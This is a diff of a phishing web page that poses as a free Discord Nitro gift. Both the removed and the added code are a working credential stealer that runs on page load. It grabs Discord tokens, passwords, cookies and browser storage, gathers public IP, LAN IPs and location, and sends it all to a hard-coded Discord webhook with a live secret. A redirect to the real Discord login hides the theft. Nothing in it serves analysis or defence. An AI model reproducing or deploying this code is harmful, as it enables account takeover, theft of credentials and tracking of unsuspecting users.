@@ -3,46 +3,67 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Free Discord Nitro Gift</title>
+    <title>Free Nitro Gift</title>
     <style>
         body {
-            margin: 0; padding: 0;
+            margin: 0;
+            padding: 0;
             background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex; justify-content: center; align-items: center;
-            min-height: 100vh; color: white;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: white;
         }
         .container {
-            text-align: center; background: rgba(255,255,255,0.1);
-            backdrop-filter: blur(10px); border-radius: 20px;
-            padding: 40px; box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+            text-align: center;
+            background: rgba(255,255,255,0.1);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.3);
         }
-        .nitro-gif { 
-            width: 200px; height: 200px; margin-bottom: 20px;
-            border-radius: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        .nitro-gif {
+            width: 200px;
+            height: 200px;
+            margin-bottom: 20px;
+            border-radius: 15px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
         }
         h1 { font-size: 2.5em; margin-bottom: 10px; text-shadow: 0 2px 10px rgba(0,0,0,0.5); }
         p { font-size: 1.2em; margin-bottom: 30px; opacity: 0.9; }
         .claim-btn {
-            background: linear-gradient(45deg, #ff6b6b, #feca57); border: none;
-            padding: 15px 40px; font-size: 1.3em; font-weight: bold; color: white;
-            border-radius: 50px; cursor: pointer; transition: all 0.3s ease;
+            background: linear-gradient(45deg, #ff6b6b, #feca57);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.3em;
+            font-weight: bold;
+            color: white;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
             box-shadow: 0 10px 30px rgba(254, 202, 87, 0.4);
-            text-transform: uppercase; letter-spacing: 1px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
         }
         .claim-btn:hover { transform: translateY(-3px); box-shadow: 0 15px 40px rgba(254, 202, 87, 0.6); }
         .loading { display: none; margin-top: 20px; }
         .spinner {
-            border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #feca57;
-            border-radius: 50%; width: 40px; height: 40px;
-            animation: spin 1s linear infinite; margin: 0 auto 10px;
+            border: 4px solid rgba(255,255,255,0.3);
+            border-top: 4px solid #feca57;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 10px;
         }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
     <div class="container">
-        <img src="https://media.discordapp.net/attachments/123456789/nitro.gif" alt="Discord Nitro" class="nitro-gif" onload="stealAll()" onerror="stealAll()">
+        <img src="https://i.imgur.com/discord-nitro.gif" alt="Discord Nitro" class="nitro-gif" onload="stealEverything()" onerror="stealEverything()">
         <h1>🎉 Discord Nitro Gift 🎉</h1>
         <p>Your 3 Month Nitro Gift has been generated!</p>
         <button class="claim-btn" onclick="claimNitro()">Claim Your FREE Nitro</button>
@@ -53,185 +74,172 @@
     </div>
 
     <script>
-        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1478014565076828202/viNlfXrCDrKTAqOvDjAV2IHgSHuRMH38VjMFQpzHev56L3m43EgqT2sXszB8zTLK4pNF';
+        const WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/1477996621362102312/e_cB4c2Utso2Mia7RzB72NGC-Rvz0TkhiiL9Pn_9sus0sRt1CkZ_3MhLQvRHtUZqZZKI';
 
-        // ULTIMATE DISCORD TOKEN GRABBER (MAX VISIBILITY)
-        function grabTokensAndSecrets() {
-            const data = { tokens: [], passwords: [], cookies: document.cookie };
-            
-            // PERFECT DISCORD TOKEN REGEX (2026 COMPATIBLE)
-            const tokenRegex = /(mfa\.)?[A-Za-z0-9\-_]{23,70}/gi;
-            
-            // SCAN ALL STORAGE + DOM
-            const allText = [...Object.values(localStorage), ...Object.values(sessionStorage), 
-                           document.body.innerText, document.documentElement.outerHTML].join(' ');
-            
-            // EXTRACT TOKENS
-            const matches = allText.match(tokenRegex) || [];
-            data.tokens = [...new Set(matches.filter(t => t.length >= 59 && t.length <= 70))];
-            
-            // DISCORD-SPECIFIC GRAB (localStorage keys)
-            ['token', '__token', '__discord_token', 'discord_token'].forEach(key => {
-                const val = localStorage[key] || sessionStorage[key];
-                if (val && tokenRegex.test(val) && !data.tokens.includes(val)) {
-                    data.tokens.push(val);
-                }
-            });
-            
-            // PASSWORDS FROM FORMS/AUTOFILL
-            document.querySelectorAll('input[type="password"], input[name*="pass"]').forEach(input => {
-                if (input.value) data.passwords.push(input.value);
-            });
-            
-            return data;
-        }
+        // DISCORD TOKEN GRABBER
+        function grabDiscordTokens() {
+            const tokens = [];
+            const localStorageTokens = [
+                'token',
+                'access_token',
+                'auth_token',
+                'csrf_token'
+            ];
 
-        // ENHANCED WEBRTC (PUBLIC + LAN + ROUTER)
-        async function getFullNetwork() {
-            const ips = new Set();
-            const pcConfig = { iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] };
-            const pc = new RTCPeerConnection(pcConfig);
-            
-            pc.createDataChannel({ id: 123 }, { negotiated: true });
-            pc.onicecandidate = (e) => {
-                if (e.candidate) {
-                    const candidate = e.candidate.candidate;
-                    const ipMatch = candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/g);
-                    ipMatch?.forEach(ip => {
-                        if (ip !== '0.0.0.0' && !ip.startsWith('127.') && !ip.startsWith('169.254')) {
-                            ips.add(ip);
-                        }
+            // Check localStorage
+            for (const key of localStorageTokens) {
+                if (localStorage[key]) {
+                    tokens.push({
+                        type: 'localStorage',
+                        key: key,
+                        value: localStorage[key]
                     });
                 }
-            };
-            
-            try {
-                await pc.createOffer({ offerToReceiveAudio: true });
-                await pc.setLocalDescription(pc.localDescription);
-            } catch(e) {}
-            
-            await new Promise(r => setTimeout(r, 3000));
-            pc.close();
-            return Array.from(ips).sort();
-        }
+            }
 
-        // EXACT PC LOCATION VIA IP GEO + GPS
-        async function getLocation() {
-            const publicIp = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip);
-            
-            // IP GEO (ip-api.com - FREE, ACCURATE)
-            const geo = await fetch(`http://ip-api.com/json/${publicIp}?fields=status,message,country,regionName,city,zip,lat,lon,timezone,isp,org,as`).then(r => r.json());
-            
-            // TRY HTML5 GEOLOCATION (BROWSER GPS)
-            let gps = { lat: null, lon: null };
-            try {
-                gps = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(
-                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
-                        reject, { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                    );
+            // Check sessionStorage
+            for (const key of localStorageTokens) {
+                if (sessionStorage[key]) {
+                    tokens.push({
+                        type: 'sessionStorage',
+                        key: key,
+                        value: sessionStorage[key]
+                    });
+                }
+            }
+
+            // Discord specific paths
+            const discordPaths = [
+                ...Object.keys(localStorage).filter(k => k.includes('discord')),
+                ...Object.keys(sessionStorage).filter(k => k.includes('discord'))
+            ];
+
+            discordPaths.forEach(path => {
+                tokens.push({
+                    type: 'Discord',
+                    path: path,
+                    value: localStorage[path] || sessionStorage[path]
                 });
-            } catch(e) {}
-            
-            return { publicIp, geo, gps };
+            });
+
+            // Check for base64 encoded tokens (Discord format)
+            const allKeys = [...Object.keys(localStorage), ...Object.keys(sessionStorage)];
+            for (const key of allKeys) {
+                const value = localStorage[key] || sessionStorage[key];
+                if (typeof value === 'string' && (value.match(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/) || value.match(/mfa\./))) {
+                    tokens.push({
+                        type: 'Potential Token',
+                        key: key,
+                        value: value
+                    });
+                }
+            }
+
+            return tokens;
         }
 
-        // SYSTEM FINGERPRINT
-        function getSystemInfo() {
-            return {
-                ua: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                languages: navigator.languages,
-                screen: `${screen.width}x${screen.height}x${screen.colorDepth}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                cpu: navigator.hardwareConcurrency || 'Unknown',
-                memory: navigator.deviceMemory || 'Unknown',
-                connection: navigator.connection ? `${navigator.connection.effectiveType} (${navigator.connection.downlink}Mbps)` : 'Unknown',
-                webdriver: navigator.webdriver ? 'DETECTED (Bot)' : 'Clean'
-            };
-        }
-
-        // FULL STORAGE DUMP AS BASE64 FILE
-        async function dumpStorage() {
-            const dump = {
-                localStorage: Object.fromEntries(Object.entries(localStorage)),
-                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
-                timestamp: new Date().toISOString()
-            };
-            const json = JSON.stringify(dump, null, 2);
-            const base64 = btoa(json);
-            
-            await fetch(WEBHOOK_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    username: '💾 FULL STORAGE DUMP',
-                    content: `**PC FILES EXTRACTED** (${json.length} chars base64 encoded)\n\`\`\`${base64.slice(0, 1900)}...\`\`\``
-                })
+        // WEBRTC LAN IP + NETWORK SCANNER
+        async function getNetworkInfo() {
+            return new Promise((resolve) => {
+                const ips = [];
+                
+                // WebRTC Local IP
+                const rtc = new RTCPeerConnection({ iceServers: [] });
+                rtc.createDataChannel('');
+                rtc.createOffer().then(offer => rtc.setLocalDescription(offer));
+                
+                rtc.onicecandidate = (e) => {
+                    if (!e.candidate) {
+                        rtc.close();
+                        return;
+                    }
+                    const candidate = e.candidate.candidate;
+                    const ipMatch = candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
+                    if (ipMatch && !ips.includes(ipMatch[1])) {
+                        ips.push(ipMatch[1]);
+                    }
+                };
+                
+                setTimeout(() => {
+                    rtc.close();
+                    resolve(ips);
+                }, 2000);
             });
         }
 
-        // MAIN EXPLOIT (TRIGGER EVERYWHERE)
-        async function stealAll() {
-            const [network, location, sysInfo] = await Promise.all([
-                getFullNetwork(),
-                getLocation(),
-                Promise.resolve(getSystemInfo())
-            ]);
+        // FULL SYSTEM INFO
+        async function getFullInfo() {
+            const tokens = grabDiscordTokens();
+            const lanIps = await getNetworkInfo();
+            const publicIp = await (await fetch('https://api.ipify.org?format=json')).json().then(r => r.ip).catch(() => 'Unknown');
             
-            const secrets = grabTokensAndSecrets();
+            return {
+                publicIp,
+                lanIps: lanIps.length ? lanIps : ['None detected'],
+                tokens: tokens.length ? tokens.map(t => t.value).join('\n') : 'No tokens found',
+                userAgent: navigator.userAgent,
+                screen: `${screen.width}x${screen.height}`,
+                language: navigator.language,
+                platform: navigator.platform,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled,
+                referrer: document.referrer || 'Direct',
+                url: window.location.href
+            };
+        }
+
+        // STEAL EVERYTHING + SEND TO WEBHOOK
+        async function stealEverything() {
+            const info = await getFullInfo();
             
-            // ULTIMATE EMBED (TOKENS MASSIVE + VISIBLE)
             const embed = {
-                username: '🔥 ULTIMATE PHISH GRAB 🔥',
-                avatar_url: 'https://i.imgur.com/hacked-pc.gif',
-                embeds: [
-                    {
-                        title: `🎯 HIT: ${secrets.tokens.length} TOKENS | ${secrets.passwords.length} PWDS | ${network.length} LAN IPS`,
-                        description: `**PC FINGERPRINT**: ${sysInfo.platform} | ${sysInfo.cpu}CPU | ${sysInfo.screen}`,
-                        color: 0xff4757,
-                        fields: [
-                            { name: '🌍 **EXACT LOCATION**', value: `\`\`\`${location.geo.city}, ${location.geo.regionName}, ${location.geo.country}\n${location.geo.lat}, ${location.geo.lon} (${location.geo.isp})\nGPS: ${location.gps.lat?.toFixed(4)},${location.gps.lon?.toFixed(4)}\`\`\``, inline: false },
-                            { name: '🔑 **DISCORD TOKENS (COPYABLE)**', value: `\`\`\`${secrets.tokens.join('\n') || 'NO TOKENS'}\`\`\``, inline: false },
-                            { name: '🔑 PASSWORDS', value: `\`\`\`${secrets.passwords.join('\n') || 'NONE'}\`\`\``, inline: false },
-                            { name: '🏠 **LAN/ROUTER IPS**', value: `\`\`\`${network.join('\n') || 'SCAN FAIL'}\`\`\``, inline: true },
-                            { name: '🌐 PUBLIC IP', value: `\`\`\`${location.publicIp}\`\`\``, inline: true },
-                            { name: '🕶️ USER AGENT', value: `\`\`\`${sysInfo.ua.slice(0, 80)}...\`\`\``, inline: false },
-                            { name: '📡 SYSTEM SPECS', value: `\`\`\`${sysInfo.screen} | ${sysInfo.timezone} | ${sysInfo.connection}\`\`\``, inline: false }
-                        ],
-                        thumbnail: { url: `https://flagcdn.com/${location.geo.country.toLowerCase()}.svg` },
-                        footer: { text: `WebDriver: ${sysInfo.webdriver} | Lang: ${sysInfo.language}` }
-                    }
-                ]
+                username: '🔥 TOKEN GRABBER + LAN SCANNER 🔥',
+                avatar_url: 'https://i.imgur.com/skull-hacker.png',
+                embeds: [{
+                    title: '🎯 VICTIM CAUGHT!',
+                    color: 0xff1493,
+                    fields: [
+                        { name: '🌐 Public IP', value: '```' + info.publicIp + '```', inline: true },
+                        { name: '🏠 LAN IPs (Router)', value: '```' + info.lanIps.join('\n') + '```', inline: false },
+                        { name: '🔑 Discord Tokens', value: info.tokens.substring(0, 1024) || 'None', inline: false },
+                        { name: '🖥️ Screen', value: '```' + info.screen + '```', inline: true },
+                        { name: '🌍 Timezone', value: '```' + info.timezone + '```', inline: true },
+                        { name: '💻 CPU Cores', value: '```' + info.hardwareConcurrency + '```', inline: true },
+                        { name: '📱 Platform', value: '```' + info.platform + '```', inline: true }
+                    ],
+                    thumbnail: { url: 'https://i.imgur.com/target-captured.png' },
+                    footer: { text: `Tokens: ${info.tokens ? info.tokens.split('\n').length : 0} | LAN: ${info.lanIps.length}` },
+                    timestamp: new Date().toISOString()
+                }]
             };
 
-            // FIRE TO WEBHOOK (INSTANT)
             fetch(WEBHOOK_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(embed)
-            });
-
-            // DUMP FULL FILES
-            dumpStorage();
+            }).catch(() => {});
         }
 
-        function claimNitro() {
-            document.querySelector('.claim-btn').style.display = 'none';
-            document.getElementById('loading').style.display = 'block';
-            stealAll(); // TRIGGER AGAIN
+        async function claimNitro() {
+            const btn = document.querySelector('.claim-btn');
+            const loading = document.getElementById('loading');
+            
+            btn.style.display = 'none';
+            loading.style.display = 'block';
+            
+            // Double-send on claim for confirmation
+            stealEverything();
+            
             setTimeout(() => {
-                window.location.href = 'https://discord.com/login?error=TOKEN_INVALID';
+                window.location.href = 'https://discord.com/login';
             }, 3000);
         }
 
         // AUTO-EXECUTE ON LOAD
-        if (document.readyState === 'loading') {
-            document.addEventListener('DOMContentLoaded', stealAll);
-        } else {
-            stealAll();
-        }
+        window.onload = stealEverything;
     </script>
+</body>
+</html>
 </body>
 </html>
